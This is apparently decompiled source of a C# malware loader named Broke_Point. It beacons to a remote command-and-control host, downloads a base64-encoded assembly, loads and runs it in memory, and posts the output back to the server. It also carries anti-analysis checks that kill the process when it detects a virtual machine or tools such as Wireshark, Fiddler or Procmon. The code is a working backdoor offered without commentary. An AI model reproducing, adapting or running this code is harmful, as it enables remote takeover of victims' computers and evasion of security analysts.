using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Xml;

namespace Broke_Point
{
	// Token: 0x02000003 RID: 3
	internal class Program
	{
		// Token: 0x06000006 RID: 6
		private static void KillSwitch()
		{
			for (;;)
			{
				if (Program.CheckVM() || Program.BlackListProcess())
				{
					Process.GetCurrentProcess().Kill();
				}
				Thread.Sleep(3000);
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002194 File Offset: 0x00000394
		private static void Main(string[] args)
		{
			try
			{
				ServicePointManager.DefaultConnectionLimit = 1024;
			}
			catch (Exception)
			{
				try
				{
					ServicePointManager.DefaultConnectionLimit = 512;
				}
				catch (Exception)
				{
				}
			}
			new Thread(new ThreadStart(Program.KillSwitch)).Start();
			if (Program.CheckVM() || Program.BlackListProcess())
			{
				return;
			}
			XmlDocument xmlDocument = null;
			string text = null;
			if (string.IsNullOrEmpty(text))
			{
				text = Guid.NewGuid().ToString().Replace("-", "");
			}
			string text2 = "";
			for (;;)
			{
				try
				{
					HttpWebResponse httpWebResponse = (HttpWebResponse)WebRequest.Create("http://game.slackhp.com/api/hb?guid=" + text).GetResponse();
					text2 = PM.ReadStreamOfPayload(httpWebResponse);
					try
					{
						httpWebResponse.Close();
					}
					catch (Exception)
					{
					}
					if (!(text2 == "ok"))
					{
						if (xmlDocument != null)
						{
							xmlDocument = null;
						}
						text2 = text2.Replace("$$$", "\"");
						xmlDocument = new XmlDocument();
						xmlDocument.LoadXml(text2);
						XmlNodeList xmlNodeList = xmlDocument.SelectNodes("//input");
						string text3 = "";
						string text4 = "";
						string s = "";
						foreach (object obj in xmlNodeList)
						{
							XmlNode xmlNode = (XmlNode)obj;
							XmlAttribute xmlAttribute = xmlNode.Attributes["id"];
							if (xmlAttribute != null)
							{
								string value = xmlAttribute.Value;
								if (value != null)
								{
									if (!(value == "c"))
									{
										if (!(value == "p"))
										{
											if (value == "l")
											{
												s = xmlNode.Attributes["value"].Value;
											}
										}
										else
										{
											text4 = xmlNode.Attributes["value"].Value;
										}
									}
									else
									{
										text3 = xmlNode.Attributes["value"].Value;
									}
								}
							}
						}
						string str = text3;
						string text5 = text4;
						object obj2 = Assembly.Load(Convert.FromBase64String(s)).CreateInstance(str + ".Ins");
						if (obj2 != null)
						{
							object obj3 = obj2.GetType().GetMethod("Run").Invoke(obj2, new object[]
							{
								text5
							});
							if (obj3 != null)
							{
								string s2 = obj3.ToString();
								HttpWebRequest httpWebRequest = WebRequest.CreateHttp("http://game.slackhp.com/api/get_p?guid=" + text);
								httpWebRequest.Method = "POST";
								using (Stream requestStream = httpWebRequest.GetRequestStream())
								{
									byte[] bytes = Encoding.UTF8.GetBytes(s2);
									requestStream.Write(bytes, 0, bytes.Length);
								}
								HttpWebResponse httpWebResponse2 = (HttpWebResponse)httpWebRequest.GetResponse();
								Console.WriteLine(PM.ReadStreamOfPayload(httpWebResponse2));
								try
								{
									httpWebResponse2.Close();
								}
								catch (Exception)
								{
								}
							}
						}
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.Message + ex.StackTrace);
				}
				GC.Collect();
				PM.Sleep(10000);
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002534 File Offset: 0x00000734
		private static bool CheckVM()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
			}
			return false;
		}

		// Token: 0x06000009 RID: 9
		private static bool BlackListProcess()
		{
			List<string> list = new List<string>();
			list.Add("procmon");
			list.Add("fiddler");
			list.Add("dumpcap");
			list.Add("wireshark");
			list.Add("systemexplorer");
			foreach (Process process in Process.GetProcesses())
			{
				try
				{
					string text = process.ProcessName.ToLower();
					foreach (string value in list)
					{
						if (text.Contains(value))
						{
							return true;
						}
					}
				}
				catch (Exception)
				{
				}
			}
			return false;
		}
	}
}
